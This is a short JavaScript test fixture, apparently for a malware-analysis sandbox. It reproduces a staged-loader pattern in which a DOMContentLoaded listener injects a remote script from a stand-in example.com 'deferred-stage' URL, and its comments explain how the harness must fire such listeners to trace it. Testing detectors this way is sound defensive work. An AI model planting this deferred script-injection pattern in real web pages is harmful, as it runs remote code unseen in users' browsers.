// Synthesized (NOT sample-derived) reproduction of the "decode now, run on
// DOMContentLoaded" staging pattern: the payload is registered as a listener
// rather than executed inline.
//
// There is no document and no event loop in the sandbox, so nothing fires this
// listener on its own. If the harness doesn't invoke DOM-ready listeners after
// the main script finishes, the script-injection below never runs and its URL
// never reaches the trace -- a silent miss with no error.
//
// The handler is registered BEFORE the value it needs is defined, which is why
// the harness must fire these after the main script completes rather than at
// registration time.
document.addEventListener("DOMContentLoaded", function () {
  var s = document.createElement("script");
  s.src = _stage;
  document.head.appendChild(s);
});

var _stage = "https://example.com/deferred-stage.js";
